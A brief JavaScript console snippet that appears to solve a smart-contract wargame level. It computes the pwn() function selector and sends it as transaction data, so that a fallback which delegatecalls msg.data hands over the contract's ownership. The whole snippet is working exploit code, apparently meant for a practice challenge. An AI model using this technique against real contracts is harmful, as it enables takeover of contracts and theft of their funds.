await contract.owner();
var pwnSignature = web3.utils.sha3("pwn()");

// fallback() external {
//     (bool result,) = address(delegate).delegatecall(msg.data);
//     if (result) {
//       this;
//     }
//   }
await contract.sendTransaction({data: pwnSignature}) //contract.sendTransaction({data: web3.utils.sha3("pwn()")})